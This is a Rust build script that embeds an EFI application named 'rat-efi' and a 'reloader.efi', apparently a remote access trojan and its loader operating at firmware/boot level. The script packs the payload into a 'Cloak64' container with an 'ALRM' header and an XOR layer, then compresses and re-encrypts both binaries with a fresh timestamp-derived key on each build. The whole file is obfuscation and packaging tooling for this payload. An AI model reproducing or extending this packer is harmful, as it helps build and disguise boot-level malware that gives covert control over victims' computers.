use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};
use std::{env, fs};

use sha2::{Digest, Sha512};

#[cfg(debug_assertions)]
const EFI_APPLICATION: &[u8] =
    include_bytes!("../rat-efi/target/x86_64-unknown-uefi/debug/rat-efi.efi");

#[cfg(not(debug_assertions))]
const EFI_APPLICATION: &[u8] =
    include_bytes!("../rat-efi/target/x86_64-unknown-uefi/release/rat-efi.efi");

const RELOADER_EFI: &[u8] = include_bytes!("../extern/reloader.efi");
const CLOAK64_HEADER_SIZE: usize = 0x200;
const CLOAK64_XOR_KEY: u8 = 0xB3;

fn encode_to_cloak64(data: &[u8]) -> Vec<u8> {
    let length = data.len();

    // CRC32 of the ORIGINAL EFI data
    let mut hasher = crc32fast::Hasher::new();
    hasher.update(data);
    let crc32 = hasher.finalize();

    // Allocate header + encrypted payload
    let mut output = vec![];
    output.resize(CLOAK64_HEADER_SIZE, 0);

    // 0x00: "ALRM"
    output[0..4].copy_from_slice(b"ALRM");

    // 0x04: encrypted data length, little-endian u32
    output[4..8].copy_from_slice(&u32::try_from(length).unwrap().to_le_bytes());

    // 0x08: 00 02 00 00
    output[8..12].copy_from_slice(&[0x00, 0x02, 0x00, 0x00]);

    // 0x0C: CRC32 of original data, little-endian
    output[12..16].copy_from_slice(&crc32.to_le_bytes());

    // 0x10..0x200 remains zero padding
    // 0x200: encrypted payload
    output.extend(data.iter().map(|b| b ^ CLOAK64_XOR_KEY));

    output
}

fn write_embedded_file(path: &Path, data: &[u8], key: &[u8]) {
    let mut compressed = vec![];
    let mut compressor = zstd::Encoder::new(&mut compressed, 22).unwrap();
    compressor.write_all(data).unwrap();
    compressor.finish().unwrap();

    let mut encrypted = Vec::with_capacity(compressed.len());
    for (i, m) in compressed.iter().enumerate() {
        encrypted.push(m ^ key[i % key.len()]);
    }

    let mut file = fs::File::create(path).unwrap();
    file.write_all(&encrypted).unwrap();
}

fn main() {
    let env_out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let cloak64_file = env_out_dir.join("cloak64.dat");
    let reloader_file = env_out_dir.join("reloader.efi");

    let key = Sha512::digest(
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos()
            .to_le_bytes(),
    )
    .to_vec();

    write_embedded_file(&cloak64_file, &encode_to_cloak64(EFI_APPLICATION), &key);
    write_embedded_file(&reloader_file, RELOADER_EFI, &key);

    let key_file = env_out_dir.join("key.rs");
    let mut file = fs::File::create(&key_file).unwrap();

    file.write_all(
        format!(
            "pub const EFI_APPLICATION_KEY: &[u8; {}] = &{key:?};\n",
            key.len(),
        )
        .as_bytes(),
    )
    .unwrap();
    file.write_all(
        format!("pub const CLOAK64_HEADER_SIZE: usize = {CLOAK64_HEADER_SIZE};\n").as_bytes(),
    )
    .unwrap();
    file.write_all(format!("pub const CLOAK64_XOR_KEY: u8 = {CLOAK64_XOR_KEY};\n").as_bytes())
        .unwrap();
}
